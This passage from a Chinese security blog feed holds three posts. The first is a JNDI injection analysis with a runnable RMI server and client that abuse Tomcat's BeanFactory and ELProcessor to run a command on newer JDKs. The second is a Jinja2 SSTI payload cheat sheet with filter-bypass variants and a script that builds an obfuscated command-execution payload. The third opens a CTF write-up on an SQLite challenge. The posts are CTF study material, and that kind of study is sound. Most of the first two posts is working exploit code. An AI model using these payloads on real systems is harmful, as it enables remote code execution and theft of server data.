&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428164825.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;唔，和之前是一样的，在本地没有找到相应类，所以这里就从codebase加载对象，这里要是深究一下里面的内容结构的话，会发现他是加载了一个UrlClassLoader（和rmi那个一样）,不深究了，反正就是通过这个方法拿到了一个工厂对象的类对象（TestRef）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428164939.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;拿到类对象以后，实例化了一下，执行构造函数，完成RCE&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428170049.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;JNDI的高版本RMI绕过&lt;/h3&gt;
&lt;h4&gt;复现Demo&lt;/h4&gt;
&lt;p&gt;pom.xml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;  
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;  
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;  
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;  
  
    &amp;lt;groupId&amp;gt;org.example&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;untitled&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;  
  
    &amp;lt;properties&amp;gt;        &amp;lt;maven.compiler.source&amp;gt;8&amp;lt;/maven.compiler.source&amp;gt;  
        &amp;lt;maven.compiler.target&amp;gt;8&amp;lt;/maven.compiler.target&amp;gt;  
        &amp;lt;project.build.sourceEncoding&amp;gt;UTF-8&amp;lt;/project.build.sourceEncoding&amp;gt;  
    &amp;lt;/properties&amp;gt;  
    &amp;lt;dependencies&amp;gt;        &amp;lt;dependency&amp;gt;            &amp;lt;groupId&amp;gt;org.apache.tomcat.embed&amp;lt;/groupId&amp;gt;  
            &amp;lt;artifactId&amp;gt;tomcat-embed-core&amp;lt;/artifactId&amp;gt;  
            &amp;lt;version&amp;gt;8.0.28&amp;lt;/version&amp;gt;  
        &amp;lt;/dependency&amp;gt;        &amp;lt;dependency&amp;gt;            &amp;lt;groupId&amp;gt;org.apache.tomcat.embed&amp;lt;/groupId&amp;gt;  
            &amp;lt;artifactId&amp;gt;tomcat-embed-el&amp;lt;/artifactId&amp;gt;  
            &amp;lt;version&amp;gt;8.0.28&amp;lt;/version&amp;gt;  
        &amp;lt;/dependency&amp;gt;  
    &amp;lt;/dependencies&amp;gt;&amp;lt;/project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;JNDIBPServer&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import javax.naming.StringRefAddr;  
import org.apache.naming.ResourceRef;  
public class JNDIBPServer {  
    public static void main(String[] args) throws Exception {  
        Registry registry = LocateRegistry.createRegistry(1099);  
        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);  
        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;Sentiment=eval&quot;));  
        resourceRef.add(new StringRefAddr(&quot;Sentiment&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));  
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);  
        registry.bind(&quot;Exec&quot;, referenceWrapper);  
        System.out.println(&quot;the Server is bind rmi://127.0.0.1:1099/Exec&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;JNDIBPClient
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;import javax.naming.*;  
public class JNDIBPClient {  
    public static void main(String[] args) throws Exception {  
        InitialContext initialContext = new InitialContext();  
        initialContext.lookup(&quot;rmi://127.0.0.1:1099/Exec&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;前情提要&lt;/h4&gt;
&lt;p&gt;这里在8u某个版本之后，jdk对于codebase加了一层处理，他会检查一下codebase中传入的url是不是可信任的url,如果是可信任的url就从中加载指定class文件,若不是可信任url则放弃执行
具体位置如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230429003829.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这直接导致我们之前通过codebase加载恶意类的方法失效
无论是前面的ldap还是rmi在此都无法使用了
最后的解决方案是利用服务器上的Tomcat内置类 &lt;code&gt;BeanFactory.getObjectInstance&lt;/code&gt; 实现RCE
(getObjectInstance为这里工厂对象默认会调的一个方法)。
总而言之,==这里的原理是利用将工厂对象设置为BeanFactory这个tomcat内置类来调用里面危险的getObjectInstance方法(里面有method.invoke)==&lt;/p&gt;
&lt;h4&gt;流程分析&lt;/h4&gt;
&lt;p&gt;前面的和之前的分析流程都是一样的，我们直接来到&lt;code&gt;getObjectInstance&lt;/code&gt;这里，跟进去看看里面的执行流程
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230429235851.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;熟悉的地方，熟悉的断点，再跟&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430000246.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;来到了和之前流程都不一样的一个地方了，之前我们在本地都找不到facrory工厂类，必须得从codebase加载factory，但现在直接就能从本地查到，省去了codebase查找的流程，在这里就能直接实例化出factory的类对象，这里不看了，直接跟进一下&lt;code&gt;facroty.getObjectInstance&lt;/code&gt;这个方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430001543.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;来到了BeanFactory里面
它这里先是依据factory的classname属性设定好了&lt;code&gt;beanClassName&lt;/code&gt;字段，用于一会儿得到类对象
再是通过ref.get方法,得到了forceString的值，这里不知道他这个forceString到底是个什么类型的东西，跟进去get看一看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430002324.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;好吧，只能说是类似于属性的东西吧，这个get方法就很常规的从列表里面取出值而已，没什么价值，我们步出回去&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430002225.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;forced是我们的方法集合,这里要记住
然后value的值是从ra里面抠出来的,这里经过处理后是&lt;code&gt;Sentiment=eval&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430003143.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;对value进行一点小小的分离处理,paoname就是&lt;code&gt;Sentiment=eval&lt;/code&gt; 等号后面的部分,param就是等号前面的部分，得到forced集合&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430004750.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最后，经过一系列比较复杂的操作(其实也还行，就是取出RefAddr里面不为scope/forceString/auth.factory的元素而已)，从那个类似属性的集合里面抠出来了方法的参数（&lt;code&gt;Runtime.getRuntime().exec()&lt;/code&gt;）交给method.invoke执行，弹出计算器，至此结束
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430011249.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230430005921.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>SSTI常用Payload</title><link>https://f4miti0n.github.io/posts/jinja2-ssti-%E6%80%BB%E7%BB%93/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/jinja2-ssti-%E6%80%BB%E7%BB%93/</guid><pubDate>Tue, 11 Apr 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;用来打Jinja2的一些常用Payload&lt;/p&gt;
&lt;h1&gt;基本流程&lt;/h1&gt;
&lt;h2&gt;寻找基类&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;寻找Object类&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;解释:在python中,object类是Python中所有类的基类,如果定义一个类时没有指定继承哪个类,则默认继承object类。
常用payload:   &lt;code&gt;{{().__class__.__mro__[-1]}}&lt;/code&gt;
（&lt;code&gt;__class__&lt;/code&gt;这个获得到str类，mro获得基类列表，这里选的-1就是object这个类）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;__base__&lt;/code&gt;             类型对象的直接基类&lt;br /&gt;
&lt;code&gt;__bases__&lt;/code&gt;           类型对象的全部基类，以元组形式，类型的实例通常没有属性 &lt;strong&gt;bases&lt;/strong&gt;
(用这个base也行)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;寻找子类&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;由Object类找子类列表
&lt;blockquote&gt;
&lt;p&gt;常用payload: &lt;code&gt;{{().__class__.__mro__[1].__subclasses__()}}&lt;/code&gt;
&lt;code&gt;__subclasses__()&lt;/code&gt;     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;寻找特定类&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;由子类列表找特定类
&lt;blockquote&gt;
&lt;p&gt;payload示例：&lt;code&gt;{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[132]}}&lt;/code&gt;
&lt;code&gt;&amp;lt;class &apos;os._wrap_close&apos;&amp;gt;&lt;/code&gt;  经过探索发现，这个类有个popen方法可以执行系统命令，是第133个类，这里就用132来选中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;实例化特定类&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;由特定类实例化特定类对象
&lt;blockquote&gt;
&lt;p&gt;payload示例： &lt;code&gt;{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[132].__init__}}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;寻找方法&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;由类对象得到方法列表
&lt;blockquote&gt;
&lt;p&gt;payload示例:&lt;code&gt;{{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__}}&lt;/code&gt;
&lt;code&gt;__globals__&lt;/code&gt;      使用方式是 function &lt;code&gt;__globals__&lt;/code&gt;获取function所处空间下可使用的module、方法以及所有变量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;调用方法&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;根据方法寻找flag
&lt;blockquote&gt;
&lt;p&gt;payload示例:&lt;code&gt;{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&apos;popen&apos;](&apos;cat /flag&apos;).read()}}&lt;/code&gt;
popen()一个方法，用于执行命令。
read() 从文件当前位置起读取size个字节，若无参数size，则表示读取至文件结束为止，它范围为字符串对象&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;常用恶意类&lt;/h2&gt;
&lt;h3&gt;Python(Jinajia2)&lt;/h3&gt;
&lt;h4&gt;具有 builtins 的类&lt;/h4&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;class &apos;_frozen_importlib._ModuleLock&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib._DummyModuleLock&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib._ModuleLockManager&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib.ModuleSpec&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib_external.FileLoader&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib_external._NamespacePath&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib_external.FileFinder&apos;&amp;gt;
&amp;lt;class &apos;zipimport.zipimporter&apos;&amp;gt;
&amp;lt;class &apos;zipimport._ZipImportResourceReader&apos;&amp;gt;
&amp;lt;class &apos;codecs.IncrementalEncoder&apos;&amp;gt;
&amp;lt;class &apos;codecs.IncrementalDecoder&apos;&amp;gt;
&amp;lt;class &apos;codecs.StreamReaderWriter&apos;&amp;gt;
&amp;lt;class &apos;codecs.StreamRecoder&apos;&amp;gt;
&amp;lt;class &apos;os._wrap_close&apos;&amp;gt;
&amp;lt;class &apos;os._AddedDllDirectory&apos;&amp;gt;
&amp;lt;class &apos;_sitebuiltins.Quitter&apos;&amp;gt;
&amp;lt;class &apos;_sitebuiltins._Printer&apos;&amp;gt;
&amp;lt;class &apos;reprlib.Repr&apos;&amp;gt;
&amp;lt;class &apos;types.DynamicClassAttribute&apos;&amp;gt;
&amp;lt;class &apos;types._GeneratorWrapper&apos;&amp;gt;
&amp;lt;class &apos;functools.partialmethod&apos;&amp;gt;
&amp;lt;class &apos;functools.singledispatchmethod&apos;&amp;gt;
&amp;lt;class &apos;functools.cached_property&apos;&amp;gt;
&amp;lt;class &apos;warnings.WarningMessage&apos;&amp;gt;
&amp;lt;class &apos;warnings.catch_warnings&apos;&amp;gt;
&amp;lt;class &apos;contextlib._GeneratorContextManagerBase&apos;&amp;gt;
&amp;lt;class &apos;contextlib._BaseExitStack&apos;&amp;gt;
&amp;lt;class &apos;sre_parse.State&apos;&amp;gt;
&amp;lt;class &apos;sre_parse.SubPattern&apos;&amp;gt;
&amp;lt;class &apos;sre_parse.Tokenizer&apos;&amp;gt;
&amp;lt;class &apos;re.Scanner&apos;&amp;gt;
&amp;lt;class &apos;tokenize.Untokenizer&apos;&amp;gt;
&amp;lt;class &apos;traceback.FrameSummary&apos;&amp;gt;
&amp;lt;class &apos;traceback.TracebackException&apos;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;文件读取类&lt;/h4&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;class &apos;file&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib_external.FileLoader&apos;&amp;gt;
&amp;lt;class &apos;site._Printer&apos;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;具有import的类&lt;/h4&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;class &apos;_frozen_importlib._ModuleLock&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib._DummyModuleLock&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib._ModuleLockManager&apos;&amp;gt;
&amp;lt;class &apos;_frozen_importlib.ModuleSpec&apos;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;常用Payload&lt;/h1&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;h2&gt;Python(Jinja2)&lt;/h2&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;h3&gt;&lt;code&gt;__globals__&lt;/code&gt;的使用&lt;/h3&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;原始版本：
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;{{url_for.__globals__.__builtins__.eval(&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&quot;)}}&lt;/code&gt;
&lt;code&gt;{{url_for.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&quot;)}}&lt;/code&gt;
&lt;code&gt;{{i.__init__.__globals__[&apos;popen&apos;](&apos;ls&apos;).read()}}&lt;/code&gt;
(这里的url_for可以换成lsbuim/get_flashed_message这样已经实例化出来的函数对象)
(也可以直接通过子类爆破的方法,找到相关函数类,实例化出函数对象)
(这里的i是os的实例化对象,具体一点的话,是os_wrap_close类)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;常用绕过技巧&lt;/h3&gt;
&lt;h5&gt;&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;点号被过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;{{url_for[&apos;__globals__&apos;][&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&quot;}}&lt;/code&gt;
(这个形式和[&lt;code&gt;__global__&lt;/code&gt;的原始使用] 第一条是对应的)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;括号内容被过滤(比如双引号)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;?name={{url_for[request.args.x1][request.args.x2][request.args.x3](request.args.x4)}}&amp;amp;x1=__globals__&amp;amp;x2=__builtins__&amp;amp;x3=eval&amp;amp;x4=__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&lt;/code&gt;
&lt;code&gt;?name={{url_for[request.cookie.x1][request.cookie.x2][request.cookie.x3](request.cookie.x4)}}&lt;/code&gt;      #args也被过滤了用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;中括号被过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}&lt;/code&gt;
离谱了，查了一查，url_for的命名空间里面本来就有os，搞不懂前面还要这么麻烦&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下划线被过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;?name={{(lipsum|attr(request.cookies.x1)).os.popen(&apos;cat /flag&apos;)}}&lt;/code&gt;
&lt;code&gt;?name={{(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)}}&lt;/code&gt;
&lt;code&gt;x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&lt;/code&gt;
attr是Jinja2内置的一个过滤器，它可以获取一个对象的属性或方法  &lt;code&gt;{{lipsum|attr(‘upper’)}}会调用lipsum.upper()方法&lt;/code&gt;
attr和getitem的区别
- attr是用来访问属性的，getitem是用来访问元素的，后者是包含关系，前者是矛盾载体和矛盾的关系&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;双大括号被过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;payload: &lt;code&gt;?name={%print(((lipsum|attr(request.cookies.x1)|attr(request.cookies.x2))(request.cookies.x3)|attr(request.cookies.x4)(request.cookies.x5)).read())%}&lt;/code&gt;
&lt;code&gt;x1=__globals__;x2=__getitem__;x3=os;x4=popen;x5=cat /flag&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;request被过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;基本原理: 利用config来构造字符串&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;import requests
url=&quot;http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name={{% print (config|string|list).pop({}).lower() %}}&quot; 
payload=&quot;cat /flag&quot;
result=&quot;&quot;
for j in payload:
    for i in range(0,1000):
        r=requests.get(url=url.format(i))
        location=r.text.find(&quot;&amp;lt;h3&amp;gt;&quot;)
        word=r.text[location+4:location+5]
        if word==j.lower():
            print(&quot;(config|string|list).pop(%d).lower()  ==  %s&quot;%(i,j))
            result+=&quot;(config|string|list).pop(%d).lower()~&quot;%(i)
            break
print(result[:len(result)-1])

// ~代表着字符串连接
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到通用payload如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?name={%print(((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower())((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())).read())%}

//得到的payload如上,以后这种题就当填空题来写,不然太烦人了
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;数字被过滤
&lt;blockquote&gt;
&lt;p&gt;半角数字绕过&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;//半角全角转换脚本
def half2full(half):
    full = &apos;&apos;
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
t=&apos;&apos;
s=&quot;0123456789&quot;
for i in s:
    t+=&apos;\&apos;&apos;+half2full(i)+&apos;\&apos;,&apos;
print(t)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?name={%print(((lipsum|attr((config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(６).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(２).lower()~(config|string|list).pop(３３).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(４２).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower())|attr((config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(６).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(２３).lower()~(config|string|list).pop(５).lower()~(config|string|list).pop(２３).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(１５７).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower()))((config|string|list).pop(２).lower()~(config|string|list).pop(４２).lower())|attr((config|string|list).pop(１７).lower()~(config|string|list).pop(２).lower()~(config|string|list).pop(１７).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(３).lower())((config|string|list).pop(１).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(２３).lower()~(config|string|list).pop(７).lower()~(config|string|list).pop(２７９).lower()~(config|string|list).pop(４).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(６).lower())).read())%}
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>2022hxpctf (sqliteweb复现)</title><link>https://f4miti0n.github.io/posts/2022hxpctf-sqliteweb%E5%A4%8D%E7%8E%B0/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/2022hxpctf-sqliteweb%E5%A4%8D%E7%8E%B0/</guid><pubDate>Wed, 05 Apr 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;之前从来没用过sqlite，这次算是长见识了
把环境配完后的界面是这样的，打开了一个encrypted的数据库，如果仔细看的话，可以发现他上面的所有数据都是加密的
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/hxf-sqlite-less1.png&quot; alt=&quot;&quot; /&gt;
其创建语句大致如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WITH bytes(i, s) AS (
    VALUES(1, &apos;&apos;) UNION ALL
    SELECT i + 1, (
        SELECT ((v|k)-(v&amp;amp;k)) &amp;amp; 255 FROM (
            SELECT
                (SELECT asciicode from ascii where hexcode = hex(SUBSTR(sha512(&apos;hxp{REDACTED}&apos;), i, 1))) as k,
                (SELECT asciicode from ascii where hexcode = hex(SUBSTR(encrypted, i, 1))) as v
            FROM mw
        )
    ) AS c FROM bytes WHERE c &amp;lt;&amp;gt; &apos;&apos; limit 64 offset 1
) SELECT group_concat(char(s),&apos;&apos;) FROM bytes;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;考验sql功底，这里其实不用管他，我们的flag并不是藏在数据表里面，知不知道这句sql的执行流程无关紧要，但这里出于学习的角度还是试着分析一下。&lt;/p&gt;
&lt;p&gt;先把它的语句结构拆分一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一层结构
&lt;blockquote&gt;
&lt;p&gt;WITH bytes(i, s)  AS ( &lt;code&gt;用来生成bytes临时表的查询语句&lt;/code&gt;)  调用bytes临时表的查询语句&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;第二层结构（ &lt;code&gt;用来生成bytes临时表的查询语句&lt;/code&gt;）
&lt;blockquote&gt;
&lt;p&gt;VALUES(1, &apos;&apos;) UNION ALL SELECT i + 1,（&lt;code&gt;用来生成第二列数据的查询语句，这里给这个列取了别名c&lt;/code&gt;）AS c FROM bytes WHERE c &amp;lt;&amp;gt; &apos;&apos; limit 64 offset 1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;第三层结构
&lt;blockquote&gt;
&lt;p&gt;SELECT ((v|k)-(v&amp;amp;k)) &amp;amp; 255 FROM (&lt;code&gt;第四层结构&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;第四层结构
&lt;blockquote&gt;
&lt;p&gt;SELECT  (&lt;code&gt;第五层结构之k列的生成&lt;/code&gt;) as k, (&lt;code&gt;第五层结构之v列的生成&lt;/code&gt;) as v FROM mw&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;第五层结构
&lt;blockquote&gt;
&lt;p&gt;K列&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SELECT asciicode from ascii where hexcode = hex(SUBSTR(sha512(&apos;hxp{REDACTED}&apos;), i, 1))
V列
SELECT asciicode from ascii where hexcode = hex(SUBSTR(encrypted, i, 1))&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;调用bytes临时表的查询语句
&lt;blockquote&gt;
&lt;p&gt;SELECT group_concat(char(s),&apos;&apos;) FROM bytes&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
